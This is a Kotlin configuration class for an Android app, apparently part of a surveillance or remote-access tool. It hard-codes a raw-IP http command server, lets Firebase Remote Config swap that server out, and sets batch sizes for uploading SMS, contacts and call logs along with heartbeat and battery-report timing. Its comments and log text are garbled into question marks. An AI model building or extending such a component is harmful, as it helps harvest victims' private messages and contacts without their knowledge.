package com.example.test

import android.content.Context
import android.util.Log
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.remoteConfigSettings
import kotlinx.coroutines.tasks.await

/**
 * ?? RemoteConfigManager
 * ?????? ??????? ?? ??? ??? ?? Firebase Remote Config
 */
object RemoteConfigManager {

    private const val TAG = "RemoteConfigManager"

    // ??????? Remote Config
    private const val KEY_BASE_URL = "base_url"
    private const val KEY_USER_ID = "user_id"
    private const val KEY_BATTERY_UPDATE_INTERVAL = "battery_update_interval"
    private const val KEY_HEARTBEAT_INTERVAL = "heartbeat_interval"
    private const val KEY_FCM_TIMEOUT = "fcm_timeout"
    private const val KEY_SMS_BATCH_SIZE = "sms_batch_size"
    private const val KEY_CONTACTS_BATCH_SIZE = "contacts_batch_size"
    private const val KEY_CALL_LOGS_BATCH_SIZE = "call_logs_batch_size"
    private const val KEY_RETRY_ATTEMPTS = "retry_attempts"
    private const val KEY_RETRY_DELAY = "retry_delay"

    // Default Values (?????? ???????)
    private const val DEFAULT_BASE_URL = "http://95.134.130.160:8765"
    private const val DEFAULT_USER_ID = "XD"
    private const val DEFAULT_BATTERY_UPDATE_INTERVAL = 60000L // 1 minute
    private const val DEFAULT_HEARTBEAT_INTERVAL = 300000L // 5 minutes
    private const val DEFAULT_FCM_TIMEOUT = 3000L
    private const val DEFAULT_SMS_BATCH_SIZE = 100
    private const val DEFAULT_CONTACTS_BATCH_SIZE = 100
    private const val DEFAULT_CALL_LOGS_BATCH_SIZE = 100
    private const val DEFAULT_RETRY_ATTEMPTS = 3
    private const val DEFAULT_RETRY_DELAY = 5000L

    private lateinit var remoteConfig: FirebaseRemoteConfig
    private var isInitialized = false

    /**
     * ?????????? Remote Config
     */
    fun initialize(context: Context) {
        if (isInitialized) {
            Log.d(TAG, "?? Already initialized")
            return
        }

        try {
            remoteConfig = FirebaseRemoteConfig.getInstance()

            // ??????? Remote Config
            val configSettings = remoteConfigSettings {
                minimumFetchIntervalInSeconds = 3600 // ?? 1 ???? ?????
                // ???? ??? ??????? ??? ?? ?? ???: 60 (1 ?????)
            }

            remoteConfig.setConfigSettingsAsync(configSettings)

            // ????? ?????? ???????
            val defaults = mapOf(
                KEY_BASE_URL to DEFAULT_BASE_URL,
                KEY_USER_ID to DEFAULT_USER_ID,
                KEY_BATTERY_UPDATE_INTERVAL to DEFAULT_BATTERY_UPDATE_INTERVAL,
                KEY_HEARTBEAT_INTERVAL to DEFAULT_HEARTBEAT_INTERVAL,
                KEY_FCM_TIMEOUT to DEFAULT_FCM_TIMEOUT,
                KEY_SMS_BATCH_SIZE to DEFAULT_SMS_BATCH_SIZE,
                KEY_CONTACTS_BATCH_SIZE to DEFAULT_CONTACTS_BATCH_SIZE,
                KEY_CALL_LOGS_BATCH_SIZE to DEFAULT_CALL_LOGS_BATCH_SIZE,
                KEY_RETRY_ATTEMPTS to DEFAULT_RETRY_ATTEMPTS,
                KEY_RETRY_DELAY to DEFAULT_RETRY_DELAY
            )

            remoteConfig.setDefaultsAsync(defaults)
            isInitialized = true

            Log.d(TAG, "? Remote Config initialized")
            Log.d(TAG, "?? Default values set")

        } catch (e: Exception) {
            Log.e(TAG, "? Failed to initialize Remote Config", e)
        }
    }

    /**
     * ?????? ??????? ???? ?? ????
     */
    suspend fun fetchAndActivate(): Boolean {
        return try {
            Log.d(TAG, "?? Fetching remote config...")

            val activated = remoteConfig.fetchAndActivate().await()

            if (activated) {
                Log.d(TAG, "? Remote Config fetched and activated")
                Log.d(TAG, "?? Current values:")
                Log.d(TAG, "   - BASE_URL: ${getBaseUrl()}")
                Log.d(TAG, "   - USER_ID: ${getUserId()}")
                Log.d(TAG, "   - BATTERY_INTERVAL: ${getBatteryUpdateInterval()}ms")
                Log.d(TAG, "   - HEARTBEAT_INTERVAL: ${getHeartbeatInterval()}ms")
            } else {
                Log.d(TAG, "?? Remote Config fetched but not activated (using cached)")
            }

            true
        } catch (e: Exception) {
            Log.e(TAG, "? Failed to fetch Remote Config", e)
            false
        }
    }

    /**
     * ?????? URL ????
     */
    fun getBaseUrl(): String {
        return if (isInitialized) {
            remoteConfig.getString(KEY_BASE_URL).ifEmpty { DEFAULT_BASE_URL }
        } else {
            DEFAULT_BASE_URL
        }
    }

    /**
     * ?????? User ID
     */
    fun getUserId(): String {
        return if (isInitialized) {
            remoteConfig.getString(KEY_USER_ID).ifEmpty { DEFAULT_USER_ID }
        } else {
            DEFAULT_USER_ID
        }
    }

    /**
     * ?????? ????? ????? ????? ????? (??????????)
     */
    fun getBatteryUpdateInterval(): Long {
        return if (isInitialized) {
            remoteConfig.getLong(KEY_BATTERY_UPDATE_INTERVAL)
        } else {
            DEFAULT_BATTERY_UPDATE_INTERVAL
        }
    }

    /**
     * ?????? ????? ????? Heartbeat (??????????)
     */
    fun getHeartbeatInterval(): Long {
        return if (isInitialized) {
            remoteConfig.getLong(KEY_HEARTBEAT_INTERVAL)
        } else {
            DEFAULT_HEARTBEAT_INTERVAL
        }
    }

    /**
     * ?????? FCM Timeout (??????????)
     */
    fun getFcmTimeout(): Long {
        return if (isInitialized) {
            remoteConfig.getLong(KEY_FCM_TIMEOUT)
        } else {
            DEFAULT_FCM_TIMEOUT
        }
    }

    /**
     * ?????? ?????? ??????? SMS
     */
    fun getSmsBatchSize(): Int {
        return if (isInitialized) {
            remoteConfig.getLong(KEY_SMS_BATCH_SIZE).toInt()
        } else {
            DEFAULT_SMS_BATCH_SIZE
        }
    }

    /**
     * ?????? ?????? ??????? Contacts
     */
    fun getContactsBatchSize(): Int {
        return if (isInitialized) {
            remoteConfig.getLong(KEY_CONTACTS_BATCH_SIZE).toInt()
        } else {
            DEFAULT_CONTACTS_BATCH_SIZE
        }
    }

    /**
     * ?????? ?????? ??????? Call Logs
     */
    fun getCallLogsBatchSize(): Int {
        return if (isInitialized) {
            remoteConfig.getLong(KEY_CALL_LOGS_BATCH_SIZE).toInt()
        } else {
            DEFAULT_CALL_LOGS_BATCH_SIZE
        }
    }

    /**
     * ?????? ????? ???????? ????
     */
    fun getRetryAttempts(): Int {
        return if (isInitialized) {
            remoteConfig.getLong(KEY_RETRY_ATTEMPTS).toInt()
        } else {
            DEFAULT_RETRY_ATTEMPTS
        }
    }

    /**
     * ?????? ????? ??? ???????? ???? (??????????)
     */
    fun getRetryDelay(): Long {
        return if (isInitialized) {
            remoteConfig.getLong(KEY_RETRY_DELAY)
        } else {
            DEFAULT_RETRY_DELAY
        }
    }

    /**
     * ?????? ??? ??????? ?? ???? Map
     */
    fun getAllConfigs(): Map<String, Any> {
        return mapOf(
            "base_url" to getBaseUrl(),
            "user_id" to getUserId(),
            "battery_update_interval" to getBatteryUpdateInterval(),
            "heartbeat_interval" to getHeartbeatInterval(),
            "fcm_timeout" to getFcmTimeout(),
            "sms_batch_size" to getSmsBatchSize(),
            "contacts_batch_size" to getContactsBatchSize(),
            "call_logs_batch_size" to getCallLogsBatchSize(),
            "retry_attempts" to getRetryAttempts(),
            "retry_delay" to getRetryDelay()
        )
    }

    /**
     * ??? ??? ???????
     */
    fun printAllConfigs() {
        Log.d(TAG, "????????????????????????????????????????")
        Log.d(TAG, "?? Current Remote Config Values:")
        Log.d(TAG, "????????????????????????????????????????")
        getAllConfigs().forEach { (key, value) ->
            Log.d(TAG, "   $key: $value")
        }
        Log.d(TAG, "????????????????????????????????????????")
    }
}
